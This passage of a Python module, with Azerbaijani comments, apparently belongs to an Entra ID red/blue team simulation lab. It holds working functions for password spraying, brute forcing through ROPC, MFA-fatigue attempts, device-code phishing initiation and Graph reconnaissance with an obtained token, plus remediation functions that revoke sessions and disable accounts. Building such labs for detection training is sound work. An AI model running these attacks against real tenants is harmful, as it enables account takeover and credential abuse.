    def run_password_spray(self, spray_password="Autumn2026!Argus", max_targets=20):
        print(f"\n[*] --- KÜTLƏVİ PASSWORD SPRAY TESTİ ('{spray_password}') ---")
        targets = self.users[:max_targets]
        success_count = 0
        fail_count = 0
        for user in targets:
            # BUG FIX: eyni MSAL exception riski (throttling/429) — spray xüsusilə
            # çox sayda ardıcıl sorğu göndərdiyi üçün ən çox bu riskə məruz qalır.
            try:
                attempt = self._ropc(user, spray_password)
            except Exception as e:  # noqa: BLE001
                print(f"[-] UĞURSUZ (exception): {user} -> {str(e)[:80]}")
                _emit_telemetry(
                    "password_spray",
                    user=user,
                    status="Failed",
                    error_code="EXCEPTION",
                    extra="AuthenticationMethod=PasswordSpray",
                )
                fail_count += 1
                time.sleep(_EXCEPTION_DELAY_S)
                continue

            if attempt["ok"] and attempt["access_token"]:
                print(f"[+] UĞURLU: {user}")
                _emit_telemetry(
                    "password_spray",
                    user=user,
                    status="Success",
                    error_code="AUTH_SUCCESS",
                    extra="AuthenticationMethod=PasswordSpray",
                )
                success_count += 1
            elif attempt["exception"] and not attempt["error_description"]:
                print(f"[-] UĞURSUZ (exception): {user} -> {str(attempt['exception'])[:80]}")
                _emit_telemetry(
                    "password_spray",
                    user=user,
                    status="Failed",
                    error_code=attempt["error_code"] or "EXCEPTION",
                    extra="AuthenticationMethod=PasswordSpray",
                )
                fail_count += 1
                time.sleep(_EXCEPTION_DELAY_S)
                continue
            else:
                err_desc = attempt["error_description"]
                err = _first_line(err_desc, 55) if err_desc else (attempt["error"] or "naməlum xəta")
                print(f"[-] UĞURSUZ: {user} -> ({err[:55]}...)")
                _emit_telemetry(
                    "password_spray",
                    user=user,
                    status="Failed",
                    error_code=attempt["error_code"] or attempt["error"] or "UNKNOWN",
                    correlation_id=attempt["correlation_id"],
                    trace_id=attempt["trace_id"],
                    extra="AuthenticationMethod=PasswordSpray",
                )
                fail_count += 1
            time.sleep(_SPRAY_DELAY_S)
        print(f"\n[=] XÜLASƏ: {success_count} Uğurlu | {fail_count} Uğursuz")

    def run_brute_force(self, target_user, target_password):
        print(f"\n[*] --- BRUTE FORCE TESTİ ({target_user}) ---")
        test_passwords = self.passwords[:6] + [target_password]
        for password in test_passwords:
            try:
                attempt = self._ropc(target_user, password)
            except Exception as e:  # noqa: BLE001
                print(f"[-] UĞURSUZ (exception): {password} -> {str(e)[:60]}")
                _emit_telemetry(
                    "brute_force",
                    user=target_user,
                    status="Failed",
                    error_code="EXCEPTION",
                    extra="AuthenticationMethod=BruteForce",
                )
                time.sleep(_EXCEPTION_DELAY_S)
                continue

            if attempt["ok"] and attempt["access_token"]:
                print(f"[+] UĞURLU: Doğru şifrə tapıldı -> '{password}'")
                _emit_telemetry(
                    "brute_force",
                    user=target_user,
                    status="Success",
                    error_code="AUTH_SUCCESS",
                    extra="AuthenticationMethod=BruteForce",
                )
                return attempt["access_token"]

            if attempt["exception"] and not attempt["error_description"]:
                print(f"[-] UĞURSUZ (exception): {password} -> {str(attempt['exception'])[:60]}")
                _emit_telemetry(
                    "brute_force",
                    user=target_user,
                    status="Failed",
                    error_code=attempt["error_code"] or "EXCEPTION",
                    extra="AuthenticationMethod=BruteForce",
                )
                time.sleep(_EXCEPTION_DELAY_S)
                continue

            err_desc = attempt["error_description"]
            err = _first_line(err_desc, 45) if err_desc else (attempt["error"] or "naməlum xəta")
            print(f"[-] UĞURSUZ: {password} -> ({err[:45]}...)")
            _emit_telemetry(
                "brute_force",
                user=target_user,
                status="Failed",
                error_code=attempt["error_code"] or attempt["error"] or "UNKNOWN",
                correlation_id=attempt["correlation_id"],
                trace_id=attempt["trace_id"],
                extra="AuthenticationMethod=BruteForce",
            )
            time.sleep(_BRUTE_DELAY_S)
        return None

    def run_mfa_fatigue_simulation(self, target_user, valid_password, count=2):
        print(f"\n[*] --- MFA FATIGUE SIMULYASİYASI ({target_user}) ---")
        for i in range(1, count + 1):
            print(f"[*] Cəhd #{i}...")
            try:
                attempt = self._ropc(target_user, valid_password)
                if attempt["ok"] and attempt["access_token"]:
                    print("    [+] UĞURLU: Daxil olundu.")
                    _emit_telemetry(
                        "mfa_fatigue",
                        user=target_user,
                        status="Success",
                        error_code="AUTH_SUCCESS",
                        extra=f"AuthenticationMethod=MfaFatigue attempt={i}",
                    )
                elif attempt["exception"] and not attempt["error_description"]:
                    print(f"    [-] UĞURSUZ (exception): {str(attempt['exception'])[:60]}")
                    _emit_telemetry(
                        "mfa_fatigue",
                        user=target_user,
                        status="Failed",
                        error_code=attempt["error_code"] or "EXCEPTION",
                        extra=f"AuthenticationMethod=MfaFatigue attempt={i}",
                    )
                else:
                    err_desc = attempt["error_description"]
                    first_line = _first_line(err_desc, 60) if err_desc else "Xəta"
                    print(f"    [-] Cavab: {first_line[:60]}...")
                    _emit_telemetry(
                        "mfa_fatigue",
                        user=target_user,
                        status="Failed",
                        error_code=attempt["error_code"] or "UNKNOWN",
                        correlation_id=attempt["correlation_id"],
                        trace_id=attempt["trace_id"],
                        extra=f"AuthenticationMethod=MfaFatigue attempt={i}",
                    )
            except Exception as e:  # noqa: BLE001
                print(f"    [-] UĞURSUZ (exception): {str(e)[:60]}")
                _emit_telemetry(
                    "mfa_fatigue",
                    user=target_user,
                    status="Failed",
                    error_code="EXCEPTION",
                    extra=f"AuthenticationMethod=MfaFatigue attempt={i}",
                )
            time.sleep(_MFA_DELAY_S)

    def run_device_code_phishing_init(self):
        print("\n[*] --- OAUTH DEVICE CODE FLOW SIMULYASİYASI ---")
        try:
            flow = self.public_app.initiate_device_flow(scopes=ROPC_SCOPES)
        except Exception as e:  # noqa: BLE001
            print(f"[-] UĞURSUZ (exception): {str(e)[:80]}")
            _emit_telemetry(
                "device_code_init",
                status="Failed",
                error_code="EXCEPTION",
                extra="AuthenticationMethod=DeviceCode",
            )
            return

        if isinstance(flow, dict) and "user_code" in flow:
            uri = flow.get("verification_uri") or flow.get("verification_uri_complete") or ""
            print(f"[+] Link: {uri} | Kod: {flow['user_code']}")
            _emit_telemetry(
                "device_code_init",
                status="Initiated",
                extra="AuthenticationMethod=DeviceCode",
            )
        else:
            detail = ""
            if isinstance(flow, dict):
                detail = _first_line(flow.get("error_description") or flow.get("error") or flow, 80)
            else:
                detail = f"gözlənilməz cavab: {type(flow).__name__}"
            print(f"[-] Device flow başladılmadı: {detail}")
            _emit_telemetry(
                "device_code_init",
                status="Failed",
                error_code="NO_USER_CODE",
                extra="AuthenticationMethod=DeviceCode",
            )

    def run_post_exploitation_audit(self, access_token):
        print("\n[*] --- TOKEN ACCESS & GRAPH RECONNAISSANCE ---")
        if not access_token:
            return
        try:
            resp, err = self._graph_request("GET", GRAPH_ME_ENDPOINT, access_token)
            if resp is None:
                print(f"[-] Graph /me sorğusu uğursuz: {err}")
                _emit_telemetry(
                    "post_exfil",
                    status="Failed",
                    error_code="NETWORK",
                    extra=f"detail={_first_line(err, 80)}",
                )
                return
            if resp.status_code == 200:
                user_data, parse_err = _safe_json(resp)
                if not isinstance(user_data, dict):
                    print(f"[-] Graph /me JSON parse: {parse_err}")
                    return
                print(
                    f"[+] Məlumat Əldə Edildi: "
                    f"{user_data.get('displayName')} ({user_data.get('userPrincipalName')})"
                )
                _emit_telemetry(
                    "post_exfil",
                    user=str(user_data.get("userPrincipalName") or ""),
                    status="Success",
                    extra="AuthenticationMethod=BearerToken",
                )
            else:
                print(f"[-] Graph /me HTTP {resp.status_code}: {resp.text[:200]}")
                _emit_telemetry(
                    "post_exfil",
                    status="Failed",
                    error_code=f"HTTP_{resp.status_code}",
                )
        except Exception as e:  # noqa: BLE001
            print(f"[-] UĞURSUZ (exception): {str(e)[:80]}")
            _emit_telemetry(
                "post_exfil",
                status="Failed",
                error_code="EXCEPTION",
            )

    # ------------------------------------------------------------------
    # BLUE TEAM — Real remediation (Microsoft Graph app-only)
    # ------------------------------------------------------------------
    def get_admin_graph_token(self):
        """
        App-only (client credentials) token əldə edir. Bunun işləməsi üçün
        Entra ID App Registration-da 'User.ReadWrite.All' (Application icazəsi)
        admin tərəfindən təsdiqlənməlidir (admin consent).

        Qaytarır: access_token (str) və ya None. Exception bubble ETMİR
        (çağıranlardakı mövcud try/except eyni qaydada işləməyə davam edir).
        """
        try:
            # Instance CCA keşi — eyni token təkrar-təkrar istənilməsin.
            cca = self._get_cca()
            result = cca.acquire_token_for_client(scopes=[GRAPH_DEFAULT_SCOPE])
            if isinstance(result, dict):
                token = result.get("access_token")
                if token:
                    return token
                log.warning(
                    "admin token rədd edildi: %s",
                    _first_line(result.get("error_description") or result.get("error"), 200),
                )
                return None
            return None
        except Exception:
            # Çağıran `except Exception as e` ilə mesajı formatlayır.
            raise

    def revoke_sign_in_sessions(self, user_upn: str):
        """Real: istifadəçinin bütün aktiv sessiya/refresh token-larını ləğv edir."""
        try:
            token = self.get_admin_graph_token()
        except Exception as e:
            return False, f"Admin token xətası: {e}"
        if not token:
            return False, "Admin token əldə edilmədi (Graph app-only icazələrini yoxlayın)."

        encoded = quote(str(user_upn or ""), safe="@")
        resp, err = self._graph_request(
            "POST",
            f"https://graph.microsoft.com/v1.0/users/{encoded}/revokeSignInSessions",
            token,
            timeout=_HTTP_TOKEN_TIMEOUT_S,
        )
        if resp is None:
            return False, f"şəbəkə: {err}"
        if resp.status_code in (200, 204):
            _emit_telemetry(
                "revoke_sessions",
                user=user_upn,
                status="Success",
                extra="AuthenticationMethod=AppOnly",
            )
            return True, "Sessiyalar ləğv edildi (revokeSignInSessions)."
        return False, f"HTTP {resp.status_code}: {resp.text[:200]}"

    def disable_account(self, user_upn: str):
        """Real: istifadəçi hesabını Entra ID-də deaktiv edir (accountEnabled=false)."""
        try:
            token = self.get_admin_graph_token()
        except Exception as e:
            return False, f"Admin token xətası: {e}"
        if not token:
            return False, "Admin token əldə edilmədi (Graph app-only icazələrini yoxlayın)."

        encoded = quote(str(user_upn or ""), safe="@")
        resp, err = self._graph_request(
            "PATCH",
            f"https://graph.microsoft.com/v1.0/users/{encoded}",
            token,
            json_body={"accountEnabled": False},
            timeout=_HTTP_TOKEN_TIMEOUT_S,
        )
        if resp is None:
            return False, f"şəbəkə: {err}"
        if resp.status_code in (200, 204):
            _emit_telemetry(
                "disable_account",
                user=user_upn,
                status="Success",
                extra="AuthenticationMethod=AppOnly",
            )
            return True, "Hesab deaktiv edildi (accountEnabled=false)."
        return False, f"HTTP {resp.status_code}: {resp.text[:200]}"


if __name__ == "__main__":
    # Yalnız birbaşa `python modules/attack_engine.py` ilə işə salındıqda test axını.
    # Hədəf UPN/şifrə REAL_CREDENTIALS-dan götürülür (hardcode yoxdur).
    info = generate_wordlists()
    print(f"[*] İstifadəçi mənbəyi: {info['user_source']}")
    print(f"[*] Real: {info['real_user_count']} | Fake: {info['fake_user_count']}")

    engine = IdentityAttackEngine(USERS_FILE, PASSWORDS_FILE)

    engine.run_user_enumeration(max_targets=18)
    engine.run_password_spray(spray_password="Autumn2026!Argus", max_targets=18)

    brute_user = f"user2@{DOMAIN}"
    brute_pass = REAL_CREDENTIALS.get(brute_user, "Company123!Secure")
    if brute_user not in REAL_CREDENTIALS and REAL_CREDENTIALS:
        brute_user, brute_pass = next(iter(REAL_CREDENTIALS.items()))
    token = engine.run_brute_force(target_user=brute_user, target_password=brute_pass)

    mfa_user = f"victimuser@{DOMAIN}"
    mfa_pass = REAL_CREDENTIALS.get(mfa_user, "ArgusPass#2026!")
    engine.run_mfa_fatigue_simulation(target_user=mfa_user, valid_password=mfa_pass, count=2)
    engine.run_device_code_phishing_init()

    if token:
        engine.run_post_exploitation_audit(token)
